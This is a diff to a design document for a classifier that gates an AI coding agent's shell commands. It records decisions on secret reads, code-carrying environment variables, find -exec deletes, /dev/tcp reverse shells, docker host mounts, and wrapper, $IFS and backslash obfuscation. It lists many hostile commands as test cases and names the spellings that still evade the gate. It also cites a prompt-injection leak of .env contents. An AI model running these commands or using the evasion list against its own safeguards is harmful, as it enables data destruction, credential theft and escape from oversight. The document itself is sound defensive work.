@@ -384,25 +384,120 @@ threat is a mistake rather than an attack, but the argv was wrong either way.
 Grok is spawned with an argument array and no `shell: true`, so nothing in a rule
 string can reach a shell.
 
+## Decision 15: a secret a shell command names is exfiltration, egress or not (added 2026-09-19)
+
+Found by a probe run against the built classifier, not by reading it. `cat ~/.ssh/id_ed25519` classified as `approval` with no breaker, so Agent mode allowed it and turbo ran it with no prompt at all.
+
+That contradicted the reasoning already written above `SECRET_PATH_PATTERNS` in the same file, which says a secret path's contents leave the machine the moment a model reads them because the model's context is uploaded to the provider by design, and that no later gate can catch it. The file-tool path honoured that: `Read` with `file_path` pointing at a key denies in all five modes. The shell path required a network verb in the same segment, so the identical leak through `cat` walked past.
+
+A network verb is no longer required. `secret-egress` still names the case where one is present, and `secret-command` names the case where one is not.
+
+The published guidance agrees on where to break the chain. A vendor write-up of this exact attack puts it plainly: the most effective break point is the sensitive read, because if the agent cannot read `~/.ssh/id_rsa` there is nothing to exfiltrate. A hardening guide's own PreToolUse hook blocks on the path appearing in the tool input at all, with no egress condition, over a list containing `.env`, `id_rsa`, `id_ed25519`, `.ssh/`, `.aws/` and `.netrc`. CVE-2025-55284 is the reason the egress condition was never sufficient anyway: a hidden prompt in a file Claude Code analysed left with `.env` contents in DNS queries, past the network controls.
+
+Two consequences are accepted rather than hidden. A write to a secret path is not a read, so a segment carrying a redirect into one stays with `protected-path-overwrite` and keeps its accurate reason; `echo key > ~/.ssh/authorized_keys` is a backdoored key file, not a leak. And a command that merely mentions a secret without printing it, `chmod 600 ~/.ssh/id_ed25519`, now denies. That is a false positive in the safe direction, it is rare in agent work, and telling `chmod` from `cat` reliably is not something a text classifier can do.
+
+An earlier shape of this fix asked whether the segment contained `>` anywhere and treated the secret as written if so. That was wrong and the probe caught it: `cat ~/.ssh/id_ed25519 2>/dev/null` has a redirect and still prints the key to standard output, so the guard let the read through. The check now asks whether this word sits on the receiving end of the redirect, which is the question that matters.
+
+## Decision 16: an environment assignment that carries code is destructive (added 2026-09-19)
+
+Found in research rather than by probing, which is why the research pass runs. CVE-2026-55743 is a shipped desktop agent whose shell allowlist stripped leading `KEY=value` assignments before validating the command, so `GIT_PAGER=/tmp/payload.sh git log` ran the payload through an allowlisted `git`. This classifier had the same shape: `readVerb` skips any word containing `=`, by design, so the assignment was invisible to every pattern in the file and the verb read as `git`.
+
+The variable has to be one that carries code and the value has to look executable, because the same CVE rule publishes its benign examples and they are common: `TZ=UTC git log` and `NODE_ENV=production npm test`. Both stay allowed, as do `GIT_PAGER=cat` and `EDITOR=vim`, whose values are builtins rather than paths. The carrier list covers the loader and runtime hooks (`LD_PRELOAD`, `LD_AUDIT`, `PYTHONSTARTUP`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`), the git program slots (`core.pager`, `core.editor`, `core.sshCommand`, `core.hooksPath`, `core.fsmonitor`, `GIT_ASKPASS`, `GIT_TEMPLATE_DIR`), the shell's own (`BASH_ENV`, `PROMPT_COMMAND`, `ENV`, `SHELL`), and the pager hooks `LESSOPEN` and `LESSCLOSE`.
+
+Two spellings needed more than the list. `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/x.sh git log` carries an index in the name, so those are matched rather than listed. And `LESSOPEN='|/tmp/x.sh %s' less file` has a pipe inside the value, which the segment splitter cuts in half, so the check also scans the raw command. A leading `=` test guards both scans, because this runs on every shell command the gate sees.
+
+## Decision 17: `find -exec rm` deletes, and its escaped parentheses are arguments (added 2026-09-19)
+
+`find / -exec rm -rf {} +` classified as `approval`. It removes a whole tree and names no `rm` in the leading position, so the verb check never saw it. This is a reported bypass against a shipped agent in the wild, filed by a user who had `find` on an allow list and `rm` on a deny list and watched the command run anyway. CVE-2026-55743 is the same oversight one layer down: its guard blocked `-exec` and `-ok` but not the functionally identical `-execdir` and `-okdir`. All four are covered here, plus an exec'd path, because `find . -execdir /tmp/run.sh {} ;` runs attacker-chosen code once per matched file and names no delete verb at all. An exec'd verb that only reads stays ordinary, so `find . -execdir grep -l TODO {} +` is not caught.
+
+The breaker reads these as deletes too, so `find / -exec rm -rf {} +` breaches the critical path.
+
+A second probe found the grouping spelling. `find . \( -name '*.log' \) -delete` split on the escaped parentheses, which the splitter treated as a subshell, and `-delete` landed in a segment of its own with no verb attached. Escaped parentheses are now replaced before splitting, so they stay arguments. `find . \( -name x \) -delete` breaches as `critical-delete`, because `.` is a critical target on the strength of the incident already on record in this repository.
+
+## Decision 18: bash's pseudo-device socket is a network channel (added 2026-09-19)
+
+`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` classified as `approval`. It is a reverse shell: bash opens the connection itself, so there is no network verb on the line for a verb table to find. `exec 196<>/dev/tcp/192.168.1.2/443` is the same thing with a file descriptor. Both are network now.
+
+This is not an exotic spelling. It has a Sigma rule of its own at critical level, a Wazuh custom rule, and it appears in every reverse-shell cheat sheet, usually wrapped in `bash -c` or url-encoded. Matching `/dev/tcp/` and `/dev/udp/` anywhere in a word catches the wrapped and encoded forms too, because quotes come off first.
+
+`/dev/tcp` is excluded from the protected-path redirect rule at the same time. `exec 196<>/dev/tcp/host/port` matched `>\s*/dev/` and reported as a write into a protected system directory, which denies the right command for the wrong reason and tells the user a file was overwritten when a socket was opened.
+
+## Decision 19: a container that mounts the host defeats containment, so the mount is what gets caught (added 2026-09-19)
+
+`docker run -v /:/host alpine rm -rf /host` deletes the host filesystem through a path the gate never sees. Nothing in `containment.ts` can help, because the delete happens in another mount namespace, and the command's own verb is `docker`.
+
+It also landed in a class turbo allows. `docker run` was a network rule for the pull it usually implies, and turbo permits network, so the escape ran with no prompt in the mode that is supposed to refuse everything but exfiltration.
+
+`run`, `create` and `exec` are no longer network for docker and podman, which also removes a card on every local container run, and a mount whose host side is `/`, `~`, `/etc`, `/home`, `/root`, `/var`, `/usr`, `/bin` or `/dev` is destructive instead. All three spellings count: `-v /:/host`, `--volume=/home:/h`, and `--mount=type=bind,source=/,target=/host`. A worktree-relative mount stays ordinary, because that is what a container is for here, and so does a named volume.
+
+## Decision 20: the wrappers, the backslash and the field separator (added 2026-09-19)
+
+Decision 11 taught the classifier to skip wrappers and named the ones Claude Code strips. A probe of 45 spellings found the list was still short, and every gap classified as `approval`.
+
+`su`, `runuser`, `pkexec`, `systemd-run`, `unshare`, `nsenter`, `script`, `watch`, `parallel` and `builtin` are wrappers now. `su` and `runuser` also take a subject before the command, so `su root -c 'rm -rf /'` needs the username skipped or the verb reads as `root`, which is neither a delete nor a wrapper.
+
+A leading backslash is stripped by turning it into a forward slash, so `\rm -rf /` resolves to the verb `rm`. This is the classic spelling that steps around a shell alias and it is published as a filter bypass in its own right, spelled there as `\u\n\a\m\e \-\a`. The same substitution improves Windows paths: `C:\Users\me\.ssh\id_rsa` gains the separators the secret patterns match on, so it reaches the `.ssh/` rule instead of sliding past it.
+
+`$IFS` becomes a space before splitting, because it is the shell's own field separator and `rm$IFS-rf$IFS/` is `rm -rf /` written without a literal space for a matcher to split on. The braced form is handled too, and published bypass write-ups use exactly this substitution to build a payload.
+
+Decision 11's forced-push fix is now applied to the rest of git. `hasDiscardingGitCommand` was still a regex needing `git` and the subcommand to be adjacent, so `git -C /repo reset --hard` and `git --no-pager clean -fdx` both walked past. It reads the segment now. `git branch -D` needed the raw command, because lowercasing is what makes `-D`, which discards an unmerged branch, indistinguishable from `-d`, which refuses to. `git branch -f` moves a branch rather than deleting one, so it stays ordinary. `stash clear`, `reflog expire`, `filter-branch`, `filter-repo`, `update-ref -d` and `tag -d` joined the discarding set.
+
+## Decision 21: the device rules read the subcommand, and `/dev/null` is not a disk (added 2026-09-19)
+
+`dd` was the only write verb the disk rule knew, and it matched any `of=/dev/` prefix, which called `dd if=/dev/zero of=/dev/null` a reformat. That was a false positive in the safe direction, but it asked for a card on a benchmark idiom and it is the kind of over-block that teaches a user to approve without reading.
+
+A block-device pattern names the device families instead, so `/dev/null`, `/dev/zero`, `/dev/shm` and the pseudo-device sockets are out. `tee`, `truncate`, `cat`, `cp`, `shred` and `dd` all count when the target is a real device.
+
+The tools that destroy a device only for some subcommands read the subcommand or the flag: `nvme format` and `nvme sanitize`, `dmsetup remove`, `wipe_table` and `suspend`, `hdparm --security-erase`, `mdadm --zero-superblock`, `badblocks -w`, `smartctl --sanitize`. Their query forms stay ordinary, because `nvme list`, `mdadm --detail`, `hdparm -I` and `dmsetup ls` are reads and a rule that asked for a card on every query would be turned off.
+
+Writes into a protected directory are caught without a redirect operator as well. `tee ~/.ssh/authorized_keys` installs a key and would otherwise have landed in `approval`. `cp` and `mv` only count when the protected path is the destination, so `cp /etc/passwd /tmp/copy` reads a protected file and stays ordinary.
+
 ## The residual gap, stated rather than closed
 
-Text-level normalisation does not contain an interpreter. `python -c
-"import os; os.system('rm -rf /')"`, `node -e`, `perl -e` and a script written to
-disk and then run all still classify as `approval`, which Agent mode allows.
-Adding those verbs to a list is the move the evidence argues against. The write-up
-of a six-layer regex filter bypassed in a shipped agent reaches the conclusion
-directly: every interpreter a denylist misses is a bypass, every quoting trick it
-misses is a bypass, and the fix that worked was to remove the shell tool and put
-an OS sandbox in front of it. A published normaliser that does nine text-level
-rewrites still lists adversarially nested obfuscation as a limitation by design.
+Every command in this section was run against the built classifier on 2026-09-19
+and still classifies as `approval`, which Agent mode allows and turbo runs with no
+prompt. The list is shorter than it was, and the boundary moved rather than
+disappeared.
 
-So this step claims a floor over the commands it can read, not over arbitrary code
-execution, and says which is which. Quoted-substring reconstruction, `c"h"m"o"d`,
-hex and octal escapes, base64, alias definitions and heredocs all still evade the
-classifier. Closing that class needs an OS-level boundary around the spawned
-process, which is a roadmap item of its own and not something a pattern table can
-deliver. `docs/backend-porting-recipe.md` section 7 now tells a porter to record
-the same limitation rather than claim otherwise.
+Still evading, verified:
+
+- **A script written to disk and then run.** `python /tmp/evil.py`, `bash /tmp/x.sh`.
+  The behaviour is in the file, and reading it to decide would mean executing it.
+- **An interpreter payload with no parentheses to split on.** The parenthesised
+  forms are caught now, see below, and the ones that are not reach the same place
+  through a different spelling.
+- **A secret named across two segments.** `cd ~/.aws && cat credentials` puts the
+  directory in one segment and the bare filename in the next, so no single word
+  carries a full secret path. Following a value from one segment into the next is
+  data lineage, which is what a real product in this space sells, and it is out of
+  scope for a classifier that is a pure function of one command string.
+- **Glob and parameter spellings the shell resolves at exec time.** `/usr/bin/n[c]`
+  is `nc`, `who$@ami` is `whoami`, `/usr/bin/p?ng` is `ping`. The classifier sees
+  the text before the shell expands it.
+- **Hex and octal escapes, base64 payloads, alias definitions, heredocs.** A
+  published bypass write-up reaches the conclusion directly: every interpreter a
+  denylist misses is a bypass, every quoting trick it misses is a bypass, and the
+  fix that worked was to remove the shell tool and put an OS sandbox in front of it.
+  A normaliser that does nine text-level rewrites still lists adversarially nested
+  obfuscation as a limitation by design.
+
+No longer evading, which the earlier text of this section claimed and was wrong
+about:
+
+- `c"h"m"o"d 777 /` is caught. Quotes come off every word before the verb is read,
+  so quoted-substring reconstruction resolves to `chmod`. `c$()url` is caught the
+  same way, because the splitter breaks on `$(`.
+- `python -c "import os; os.system('rm -rf /')"` is caught. The splitter breaks on
+  parentheses, and the inner `rm -rf /` becomes a segment of its own whose verb is
+  `rm`. That is luck rather than design, and it is recorded here because claiming
+  credit for it would overstate the guarantee.
+- `\rm -rf /` and `rm$IFS-rf$IFS/` are caught, by decision 20.
+
+So the claim stays precise and is now narrower than it was. This step puts a floor
+under the commands the classifier can read. It does not contain arbitrary code
+execution, and that needs an OS-level boundary around the spawned process, which is
+a roadmap item of its own. `docs/backend-porting-recipe.md` section 7 tells a porter
+to publish the same limitation rather than claim otherwise.
 
 ## What is app-enforced and what is engine-enforced
 
